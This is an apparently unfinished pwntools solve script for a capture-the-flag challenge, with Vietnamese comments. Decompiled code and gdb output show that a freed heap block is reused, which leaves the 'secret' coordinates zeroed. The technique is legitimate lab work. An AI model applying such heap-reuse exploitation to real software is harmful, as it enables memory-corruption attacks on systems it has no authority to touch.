from pwn import *

p = process('./chall')

# __int64 __fastcall approvePlan(int *a1)
# {
#   if ( a1[8] <= 9 && a1[9] <= 199 && a1[10] <= 199 )
#     return 1;
#   free(a1);
#   return 0;
# }

# Truoc het de duoc approve plan thi 
# Kich thuoc toa nha a1[8] phai <= 9
# Toa do east-west a1[9] va toa do north-south a1[10] <= 199 

#input()
gdb.attach(p, '''
    b approvePlan         
    c
    x/12dw $rdi  
    c            
''')


p.sendlineafter(b'Enter the name of your building: ', b'lol')
p.sendlineafter(b'Enter the size of your building (in acres): ', b'1')
p.sendlineafter(b'Enter the east-west coordinate or your building (miles east of the city center): ', b'2')
p.sendlineafter(b'Enter the north-south coordinate or your building (miles north of the city center): ', b'3')

'''
char s[8]; // [rsp+30h] [rbp-40h] BYREF
  v19 = (int *)malloc(44u);
  *v19 = rand() % 100 + 10;
  v19[1] = rand() % 150 + 50;
  v19[2] = rand() % 150 + 50;
  for ( i = 0; i <= 7; ++i )
    v19[i + 3] = rand() % 100;

    printf("Enter the east-west coordinate: ");
    fgets(s, 32, stdin);
    v11 = atoi(s);
    printf("Enter the north-south coordinate: ");
    fgets(s, 32, stdin);
    v12 = atoi(s);
    if ( v11 == v19[1] && v12 == v19[2] )
    {
      printf("Correct! Welcome to the guild!");
      stream = fopen("flag.txt", "r");
      fgets(v10, 32, stream);
      printf("Here is the password to enter guild HQ: %s", v10);
      return 0;
    }
    else
    {
      puts("Incorrect guess");
'''

'''
__int64 __fastcall approveHQ(int *a1)
{
  if ( *a1 <= 99 && a1[1] <= 49 && a1[2] <= 49 )
    return 1;
  free(a1);
  return 0;
}
'''

# Co the thay v19 sau khi tao gia tri rand, se luon luon bi free boi ham approveHQ do v19[1] luon >= 50
# Chatgpt bao check gia tri arg1(rdi)(v18) cua thang approvePlan thi vi tri 0,1,2 se la cua v19 boi vi sau khi cap phat bo nho cho v19 malloc(44) sau do free(v19) thi chuong trinh lai thay v18 = malloc(44) nen la heap su dung lai gia tri cua v19 sau do chi gan cho v18[8] v18[9] v18[10] cho nen la khong ghi de cac gia tri v18[0, 1, 2] => bang 0 het

'''
gef> b approvePlan
gef> r
....... Nhap xong toa nha cua minh
gef> x/12dw $rdi
0x55e60419f2a0: 174878572       0       0       0
0x55e60419f2b0: 0       0       0       0
0x55e60419f2c0: 1       2       3       0
'''

p.interactive()